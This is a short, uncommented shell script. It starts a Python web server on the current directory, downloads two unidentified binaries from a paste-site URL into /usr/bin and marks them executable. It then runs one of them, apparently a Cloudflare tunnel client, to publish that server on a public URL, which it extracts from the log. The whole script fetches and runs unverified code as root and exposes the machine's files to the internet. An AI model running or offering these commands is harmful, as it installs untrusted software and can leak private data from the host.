python3 -m http.server &
curl -L https://yaso.su/raw/iUETTYfG -o /usr/bin/c && chmod +x /usr/bin/c
curl -L https://yaso.su/CfbqGryX -o /usr/bin/cfd && chmod +x /usr/bin/cfd
sleep 3
cfd --url http://localhost:8000 --no-autoupdate > /root/cfd.log 2>&1 &
sleep 3
cat /root/cfd.log | grep -oE 'https://.*[a-z]+cloudflare.com' > /root/cfdl
